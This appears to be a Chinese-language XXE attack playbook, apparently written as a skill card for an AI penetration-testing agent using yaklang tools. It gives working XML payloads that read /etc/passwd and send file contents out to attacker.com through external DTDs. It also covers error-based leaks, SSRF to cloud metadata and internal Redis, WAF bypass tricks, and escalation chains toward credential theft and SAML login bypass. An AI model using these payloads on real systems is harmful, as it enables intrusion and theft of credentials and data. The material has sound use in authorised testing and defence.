---
name: xxe
description: CWE: 611 / 827 | ROI: 极高 (P0) 轻便原则: 只放 XXE 高 ROI 路由: 经典文件读取 / Blind-OOB / SSRF 链。具体 DTD 变体不堆。
category: vuln
tags: [server]
---

# XXE 决策卡 (Light Deep Card)

> **CWE**: 611 / 827 | **ROI**: 极高 (P0)
> **轻便原则**: 只放 XXE 高 ROI 路由: 经典文件读取 / Blind-OOB / SSRF 链。具体 DTD 变体不堆。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 请求 Content-Type 为 `application/xml` / `text/xml` | XML 解析入口 | §1 |
| 请求含 SOAP Envelope | SOAP 服务 | §1 + SOAP 专用 |
| 响应含 XML 解析错误 | XXE 可能 | §1 探测 |
| Content-Type 非 XML 但接受 XML | 内容协商 | 试改 Content-Type |
| 上传 SVG / DOCX / XLSX | 嵌入 XXE | §4 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 1. 经典 XXE (有回显)

### 1.1 First-pass

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

响应中出现 `/etc/passwd` 内容 → 确认 XXE。Windows 用 `file:///C:/Windows/win.ini`。

### 1.2 参数实体 (普通实体被禁时)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://your-dnslog.cn/xxe.dtd">
  %dtd;
]>
<root>test</root>
```

DNSLog 收到请求即确认解析器支持外部实体。

---

## 2. Blind XXE (无回显)

### 2.1 OOB 外带

```xml
<!-- 攻击者服务器放 xxe.dtd -->
<!-- xxe.dtd: <!ENTITY % file SYSTEM "file:///etc/hostname"> -->
<!--          <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM 'http://attcker.com/?x=%file;'>"> -->
<!--          %eval; %oob; -->

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root>test</root>
```

OOB 通道见 [../oob-infrastructure.md](../oob-infrastructure.md)。

### 2.2 Error-based

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root>test</root>
```

错误信息中泄露文件内容。

---

## 3. XXE → SSRF 链

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

- 云元数据 → [../cloud-security.md](../cloud-security.md)
- 内网端口探测 → 修改 URL 扫描内网服务
- Redis `http://127.0.0.1:6379/` → 可能未授权

---

## 4. 文件上传 XXE

| 文件类型 | 注入位置 |
|----------|----------|
| SVG | `<svg><text>&xxe;</text></svg>` |
| DOCX / XLSX / PPTX | 解压 → `word/document.xml` 或 `[Content_Types].xml` 注入 |
| XML 配置上传 | 直接注入 DOCTYPE |

---

## 5. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| `Entity not allowed` / `External entity forbidden` | 解析器禁用外部实体 | 试参数实体;试 UTF-16 编码绕 WAF |
| 响应完全无变化 | 盲 XXE 或解析器忽略 | OOB;Error-based |
| 只在 SOAP 中生效 | SOAP Body 是唯一被解析的 | 只在 SOAP Body 内注入 |
| WAF 拦截 `<!DOCTYPE` | 编码绕过 | UTF-16 / Base64 编码整个 XML |
| 文件上传后无解析 | 上传只是存储,不解析 | 转上传漏洞链 |

---

## 6. 级联

- XXE 读文件 → 找凭证/密钥 → [../sensitive-info-exploitation.md](../sensitive-info-exploitation.md)
- XXE → SSRF → 云元数据 → [../cloud-security.md](../cloud-security.md)
- XXE → SSRF → 内网服务 → [ssrf.md](ssrf.md)
- 读应用配置 → 数据库密码 → SQL 直连

---

## 7. Attack Surface

| 入口 | 备注 |
| :--- | :--- |
| **SOAP / WSDL 接口** | XML 默认 |
| **REST 支持 XML Content-Type** | 内容协商 |
| **XML 配置上传** | 业务允许导入 XML 配置 |
| **SVG 上传** | 头像 / 图标 / 图表 |
| **Office 文档上传 (DOCX/XLSX/PPTX)** | 内部是 XML zip |
| **RSS / Atom feed 接收** | 订阅类业务 |
| **OPML / KML / GPX 文件** | 地图 / 大纲软件 |
| **SAML Response / Request** | 单点登录 |
| **XML-RPC 接口** | WordPress / 老系统 |
| **HTML5 SVG 嵌入** | `<img src="x.svg">` |
| **EPUB 电子书上传** | 内部是 XML |

---

## 8. High-Value Targets

1. **SOAP / Legacy XML API** — XXE 主战场 (P0)
2. **SVG 头像上传** — 用户态触发,Stored XXE (P0)
3. **DOCX / XLSX 文件解析** — `Apache POI` 等历史漏洞 (P0)
4. **SAML 端点** — 攻击企业 SSO (P0)
5. **配置导入** — 管理后台功能 (P0)
6. **WSDL 端点** — 老服务通常未禁外部实体 (P0)
7. **XML-RPC (WordPress)** — `system.listMethods` 探测 (P1)

---

## 9. Bypass Techniques

| 阻碍 | 绕过 |
| :--- | :--- |
| 拦 `<!DOCTYPE` | UTF-16 编码整个 XML / Base64 编码 |
| 普通实体被禁 | 用参数实体 (`%`) |
| 外部实体被禁 | Error-based / 看是否解析 |
| 仅响应 200 | OOB DNS / HTTP / FTP |
| Content-Type 严检 | 试 `application/soap+xml` / `text/xml;charset=utf-8` 各种变体 |
| LIBXML2 ≥ 2.9 默认关 entity | 看版本 / 应用层是否覆盖 |
| Java URL whitelist | 用 `jar://` `netdoc://` 协议绕过 |

---

## 10. False Positives

| 误报 | 真实判断 |
| :--- | :--- |
| OOB DNS 命中但内容不显 | 服务端解析了 DTD 但未处理实体 | 试 Error-based |
| 响应含 `external entity` 关键字 | 可能只是 WAF 报错页 | 看是否真注入成功 |
| `&xxe;` 原样回显 | 实体未解析 | 不是 XXE,只是 echo |
| 上传 SVG 后无 XXE | 解析时禁用了 entity / 业务侧只显示 | 看是否真渲染 |

---

## 11. Impact / 升级路径

| 链 | 终态 | Impact |
| :--- | :--- | :--- |
| 读 /etc/passwd / shadow (root) | 系统信息泄露 | High |
| 读应用配置含 DB 密码 | DB 凭证 → 直连 | Critical |
| 读 .env / cloud credentials | AK/SK 泄露 | Critical |
| OOB DNS 仅证明 | 反序列化/解析可控但受限 | High |
| XXE → SSRF → 云元数据 | AK/STS 拿到 | Critical |
| XXE → SSRF → 内网 K8s/Redis | 内网横向 | Critical |
| Blind XXE 大文件外带 | 慢 + 不稳 | Medium-High |
| SAML XXE → 任意账号登录 | 单点登录绕过 | Critical |

**证据 (P3.5)**:
- 读 /etc/passwd 截前 3 行脱敏
- OOB-only 证明,不要直接 dump 大文件
- 云元数据触发后 HITL 确认是否升级

---

## 12. Pro Tips

- **First-pass DTD 文件外置**: 自建 `attacker.com/xxe.dtd`,业务 XML 只 reference,WAF 大概率不查远程 DTD 内容
- **参数实体永远优先**: `%` 比 `&` 限制少
- **UTF-16 编码绕 WAF**: 整个 XML 转 UTF-16 BE/LE,WAF 不解码
- **OOB 用 FTP 协议**: Java 老版本支持 FTP,response wire 直接送回数据
- **SAML XXE 通常无回显**: 走 OOB-only,但影响 P0
- **DOCX 注入位置**: 解压后改 `word/document.xml` 顶部 DOCTYPE
- **国内 SOAP 系统**: 银行 / 电信 / 政务老系统,XXE 命中率极高
- **`netdoc://` Java 老 trick**: 比 `file://` 更宽松,Java 5/6 有效
- **php_filter 协议**: `php://filter/read=convert.base64-encode/resource=...` 读源码

---

## 13. 工具升级线

**classic 版**:
- 综合检测: `xxeserv` / Burp Active Scan
- DTD server: `xxer-server` / Python http.server
- OOB: `interactsh`

**toolPlus 版**:
- `mcp__yaklang__http_fuzzer` 一次 sweep 多 DTD payload
- `mcp__yaklang__query_oob_record` 自建 OOB
- `mcp__yaklang__exec_codec` 处理 UTF-16 / Base64 编码
- `mcp__yaklang__ssa_compile language="java"` + SyntaxFlow 找 `DocumentBuilderFactory` sink

---

## 14. 相关参考

- SSRF → [ssrf.md](ssrf.md)
- 文件上传 → [upload.md](upload.md)
- OOB 通道 → [../oob-infrastructure.md](../oob-infrastructure.md)
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
